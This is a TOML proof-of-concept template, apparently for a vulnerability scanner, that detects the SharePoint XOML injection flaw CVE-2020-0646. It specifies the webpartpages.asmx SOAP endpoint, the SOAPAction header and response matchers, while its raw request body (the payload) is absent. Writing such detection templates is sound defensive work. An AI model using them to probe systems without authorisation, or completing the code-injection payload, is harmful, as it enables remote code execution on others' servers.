[info]
author = "ave"
description = "通过向 SharePoint 的 webpartpages.asmx SOAP 接口发送包含恶意 XOML 工作流标记的请求，检测 .NET Framework 远程代码执行注入漏洞（CVE-2020-0646）。该检测通过构造包含 CallExternalMethodActivity 代码注入载荷的 SOAP 请求，并检查响应中是否包含有效的 SOAP 响应体来判断目标是否存在漏洞。"
id = "POC-AVE-2020-0008"
name = "Microsoft SharePoint XOML Injection PoC"
severity = "critical"
tags = ["ave-2020-0008"]
vuln_id = [
    "CVE-2020-0646",
    "AVE-2020-0008",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/_vti_bin/webpartpages.asmx"
protocol = "http"

[poc.requests.body]
type = "raw"

[poc.requests.headers]
Content-Type = "text/xml; charset=utf-8"
SOAPAction = "http://microsoft.com/sharepoint/webpartpages/ValidateWorkflowMarkupAndCreateSupportObjects"
User-Agent = "Mozilla/5.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["ValidateWorkflowMarkupAndCreateSupportObjectsResponse"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
